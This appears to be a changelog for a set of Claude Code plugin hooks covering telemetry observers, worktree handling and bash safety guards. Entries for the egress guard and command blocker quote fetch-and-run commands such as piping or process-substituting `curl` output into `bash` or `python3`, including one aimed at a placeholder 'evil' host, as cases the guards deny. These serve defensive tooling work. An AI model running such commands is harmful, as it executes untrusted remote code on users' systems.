(217 -> 219: M170/#3126 2026-07-24 — new pretool/task/workflow-agenttype-advisor on PreToolUse[Workflow], plus a second dispatch ref on the same new Workflow matcher routing the existing lifecycle/webhook-forwarder (dispatch-count convention: both entries stamp the total). The 2026-07 cross-account audit found workflow-internal spawns are the largest generic bucket (3,559/30d, 49% of all traffic) and structurally invisible to the Task-side advisor (Workflow stages never pass PreToolUse[Task]). The new hook scans an inline `script` for agent() call sites; when NONE set opts.agentType it injects an advisory with the stage-shape -> specialist table from dynamic-workflow-patterns.md. Advisory only: always allow, silent for named/scriptPath runs, silent when >=1 stage is already typed. Same change set types the shipped scripts: audit-full-mapreduce STAGE_AGENT now covers architecture -> ork:system-design-reviewer and dependencies -> ork:security-auditor (mixed "full" stays generic by design), and cover/heal-loop's repair stage runs as ork:test-generator.)

(count unchanged, 2026-07-24): pretool/bash network-egress-guard DENY tier is now QUOTE-AWARE (#3122). It scanned `normalizeSingle(raw)`, which strips quote characters but keeps their CONTENT, so a quoted mention of an RCE pattern (a `grep`/`rg` search string, an `echo`, a commit message) was hard-BLOCKED as if it were an invocation. Hit live while grepping test files. The DENY tier now scans `egressDenyScanView(raw)`: quoted regions are blanked EXCEPT the argument an interpreter executes (`eval "…"`, `bash -c`, `python -c`, node/perl/ruby `-e`, php `-r`), so `bash -c "bash <(curl evil)"` still DENIES while `grep "bash <(curl x)"` ALLOWS. The ASK tier deliberately keeps the raw normalized command (it must still see quoted URLs for the host-allowlist checks). New network-egress-guard.test.ts adds the full allow/deny matrix (18 cases; the guard previously had no behavioral test).

(count unchanged, 2026-07-24): pretool/bash compound-command-validator deny for a process substitution feeding an interpreter (`bash <(curl x)`, `python3 <(curl x)`) now appends the same fetch-to-file REDIRECT as the pipe guard. It is the procsub spelling of `curl | bash`, so the reason must name the allowed shape or the model re-emits it (CC keeps no memory of a denied command). Scoped: the redirect is appended ONLY for `process substitution feeding ...` findings; brace expansion / IFS / nested-substitution findings keep the generic "rewrite plainly" guidance (they have no fetch-to-file analogue). 2 tests added. Parity with the pipe-guard change below.

(count unchanged, 2026-07-24): pretool/bash dangerous-command-blocker pipe-to-interpreter deny now REDIRECTS instead of dead-ending. permissionDecisionReason is fed back to the model on a PreToolUse deny, and CC keeps no memory of a denied command (no dedup, no backoff), so a bare "blocked, dangerous" reason made the model re-emit the same `curl <url> | python3` idiom every turn and every session, hitting the same wall forever. `pipesToShellInterpreter` now returns `'exec' | 'interpreter' | null`; the deny reason names the allowed shape per case (fetch to a file, then read it locally; local data into an interpreter stays allowed per #3096). Message text was unpinned by tests, so 2 redirect assertions were added.

(215 -> 217: #3327 2026-08-09 — registered the last 2 never-listened CC hook events as OBSERVER-ONLY telemetry hooks (never block, never modify): lifecycle/directory-added (DirectoryAdded, CC 2.1.219 — fires on /add-dir or SDK register_repo_root) and notification/message-display-observer (MessageDisplay, CC 2.1.152). Both async t=5, matcher *, logHook size-capped metrics only — no content or path body logged; webhook forwarding deferred, see INTENTIONAL_EXCLUSIONS in webhook-forwarder-coverage.test.ts. **CORRECTS the 2026-07-15 note below**: `claude plugin validate` on CC 2.1.226 ACCEPTS hooks.MessageDisplay and hooks.DirectoryAdded. Re-probed against a copy of the built plugin — the validator still reads hooks/hooks.json and still rejects unknown keys (a fabricated `TotallyBogusEventZZZ` key failed with `hooks.TotallyBogusEventZZZ: Invalid key in record`), so the check is live, not disabled; these two keys are simply in its schema now. #3327 did NOT re-run ork's rules materialization against the added directory as the issue proposed: the payload field carrying the path is unverified against the binary, and materializeAntipatternRules writes byte-identical content to every target, so a second copy costs context tokens rather than correcting anything.)

(216 -> 218: P3-A3 2026-07-15 — registered 2 never-listened CC 2.1.208 events as OBSERVER-ONLY telemetry hooks (never block, never modify): prompt/prompt-expansion-observer (UserPromptExpansion), posttool/tool-batch-observer (PostToolBatch); MessageDisplay observer was reverted same-day — `claude plugin validate` rejected hooks.MessageDisplay as an invalid key in plugin manifests. **STALE as of CC 2.1.226 — see the #3327 entry above.** All async t=5, matcher *, logHook size-capped metrics only — no content logged; webhook forwarding deliberately deferred on these high-frequency events, see INTENTIONAL_EXCLUSIONS in webhook-forwarder-coverage.test.ts)

(215 -> 216: #2475 InstructionsLoaded re-architecture — the real event is SINGLE-FILE {file_path, memory_type, load_reason}; per-file handlers (token-budget, smart-suggestions) stay on InstructionsLoaded with session-state accumulation + systemMessage-only output (output-guard strips additionalContext there); whole-set handlers (priority-map, content-dedup, rule-conflicts, drift-detection, debt-surfacer) moved to the NEW SessionStart instructions-loaded/session-rules-audit (async t=5), which reads CLAUDE.md + .claude/rules/*.md from disk where additionalContext IS honored)

(re-registered subagent-stop/unified-dispatcher, orphaned since v7.30.0/#1206 — agent-usage + subagent-quality analytics writer)

(18 once:true context loaders).

#3023 (2026-07-20, 216 -> 217): lifecycle/analytics-liveness-check (SessionStart, async t=5) peer-compares the independent JSONL writers under ~/.claude/analytics/ (skill-usage, agent-usage, hook-timing) and warns when one is stale >=48h while a sibling wrote within 24h — i.e. the pipeline is provably alive and that writer is provably dead. Motivated by skill-usage.jsonl recording ONE entry between 2026-03-07 and 2026-07-13 while agent-usage logged 245-1132 events/day; nothing warned for four months. Silent by design when the analytics dir is absent, fewer than two watched files exist, or ALL files are stale (an idle machine is not a dead writer). Opt-out ORK_NO_ANALYTICS_LIVENESS_WARN=1; dir override ORK_ANALYTICS_DIR (tests). Shipped alongside SQLite migration 003-routing-edges.sql (user_version 2 -> 3, routing_edge view, 120s-bounded).

#2590 (2026-07-10): lifecycle/telemetry-dark-check (SessionStart, async t=5) warns when $ORCHESTKIT_HOOK_TOKEN is set but $ORCHESTKIT_HOOK_URL is unset AND local .claude/telemetry/*.jsonl is accumulating (>64KiB) — telemetry-sync silently no-ops and rotated files never clear; inverse of #1860; opt-out ORK_NO_TELEMETRY_DARK_WARN=1.

#2376 (2026-07-10): removed orphaned subagent-start/subagent-context-stager (importable via registry but never in hooks.json → never dispatched; lib/spawn-depth.ts resolveAndRecordDepth deleted with it — the unwritten agent-depth.json registry was the issue's one real defect; staging owned by HQ per #897).

#959-regression fix (2026-07-09): PreToolUse Skill matcher block restored — pretool/skill/skill-tracker re-dispatched (async, t=5; dropped by the #959 hooks.json rework), reviving skill-usage.log + sessions.db skill_invocation (M168's only feeder) + skill-channels.jsonl main channel (#2154).

#debt: posttool/write/debt-marker-tracker (PostToolUse Write/Edit, async) captures `// ork-debt: <choice>, upgrade to <path>, when <trigger>` markers; instructions-loaded/debt-surfacer renders them as a session-start ledger — the counterpart to the YAGNI gate (prevent over-engineering) that records deliberate under-engineering.

#2371: pretool/task/spawn-intent-logger (PreToolUse[Task] via sync-task-dispatcher) records subagent_type+description spawn intents (SubagentStart carries neither — live-verified CC 2.1.173); subagent-validator omits spawn_depth without real parent lineage; task-agent-advisor nudges domain-shaped general-purpose tasks toward ork specialists.

#2335: worktree/worktree-provisioner (WorktreeCreate) OWNS provisioning per current CC contract (git worktree add + bare path on stdout; absorbs enter-registrar children-bus/pending-marker post-create and the logger monorepo advisory; sparsePaths honored via sparse-checkout).

M168 Phase 4 (#1914): worktree/exit-finalizer (WorktreeRemove) + pretool/settings-override-resolver (PreToolUse) — Layer 4 worktree advisory `children-bus` + per-session settings overrides backed by SQLite.

M168 Phase 3 (#1913): posttool/chain-staleness-checker (PostToolUse) — Layer 3 events.jsonl event-log at ~/.local/state/orchestkit/events.jsonl with POSIX O_APPEND atomic writes, 10MB rotation to .1, cursor-based reads, and a discriminated-union Event schema (goal_converged|chain_stale|chain_phase_changed|session_end|worktree_done|pr_merged). Rate-limited per-session (5min) chain-staleness checks. (#2217 drift cleanup: stop/goal-convergence-emitter removed — CC owns goal-current.json; stop/goal-tracker already writes goal-history.jsonl.) M168 Phase 2 (#1912): lifecycle/session-registrar (SessionStart) + lifecycle/session-finalizer (SessionEnd) + posttool/heartbeat (PostToolUse) — Layer 1 SQLite session registry at ~/.local/state/orchestkit/sessions.db with WAL pragmas, schema migrations, BEGIN IMMEDIATE retry, and PRAGMA integrity_check auto-quarantine; replaces broken agent-watchdog (#1830) liveness semantics.

#1884: lifecycle/sweep-stale-worktrees — SessionStart async hook removes sibling directories matching `<repo>-*` that are NOT in `git worktree list`, have zero files (find -type f), and are >1h old; closes the trap where aborted Agent(isolation:"worktree") runs leave empty paths that block fresh `git worktree add`. Opt-out via ORK_NO_STALE_SWEEP=1. M141 #1860: lifecycle/hook-token-check — SessionStart async hook scans .claude/settings.local.json (project + ~) for type:http entries that reference $ORCHESTKIT_HOOK_TOKEN; emits a single stderr banner when the env var is unset (defense-in-depth, paired with generate-http-hooks --write refusal). M138 #1826: lifecycle/cleanup-envelope-corruption — SessionStart async hook quarantines historical `{"continue":true,...}`-named entries under ~/.claude/hooks/sessions/ and <projectDir>/.worktrees/ (recurrence of #1250 reached EnterWorktree's name path); idempotent via ~/.claude/.orchestkit-envelope-cleanup-done marker. Paired with safeIdentifier() guard in lib/safe-fs.ts applied at WorktreeCreate.name read + getSessionTempDir(sessionId). M119 #1815: lifecycle/rules-size-check — SessionStart async hook warns when .claude/rules/*.md exceeds 35k chars (12.5% safety margin under CC's 40k auto-load cliff). Operator-facing stderr signal; references CONTRIBUTING-SKILLS.md storage-patterns (#1816). M119 PR-2 (#1794 follow-up): prompt/worktree-advisory-consumer — UserPromptSubmit reads .claude/state/worktree-advisory-*.md written by worktree-lifecycle-logger on monorepo detect, injects sparsePaths nudge as additionalContext (CC doesn't consume it on WorktreeCreate event itself). M119 (#1795) / M104 PR-A: lifecycle/ask-fallback-injector — SessionStart async hook injects text-prompt reminder when ORK_ASK_FALLBACK=text is set; pins to cached prompt prefix (previously UserPromptSubmit, re-injected per turn). Webhook forwarder is standalone async on ALL 27 events (v7.29.0: decoupled from dispatchers — zero inline forwarder calls). M121 #1489: posttool metrics-dispatcher fans out webhook-forwarder+metrics-bridge+context-crossing-warn in-process on the catchall matcher (2 hooks.json entries collapsed into 1). M119 #1476: nudge-outcome-resolver added on SessionStart to close the pre-compact-prompt feedback loop. M126 #1543: posttool/secret-handler scans Read/Bash/Grep/Glob for API keys + private blocks via CC 2.1.121 updatedToolOutput; OFF by default, ORK_SECRET_HOOK=AUDIT|REDACT to enable. M130 #1487: lifecycle/cc-version-check warns when running CC drifts from feature matrix. M140 Bundle B (#1790, #1791): prompt/goal-tracker + stop/goal-tracker write /goal convergence telemetry to .claude/state/goal-history.jsonl; lifecycle/goal-budget-guard (SessionEnd) enforces ORK_GOAL_MAX_TURNS_PER_SESSION (default 30) / ORK_GOAL_MAX_TOKENS_PER_SESSION (default 250k) by writing .claude/state/goal-budget-tripped.json, which prompt/goal-tracker reads with continueOnBlock:true so the user can override by deleting the file. All timeouts in SECONDS per CC spec.
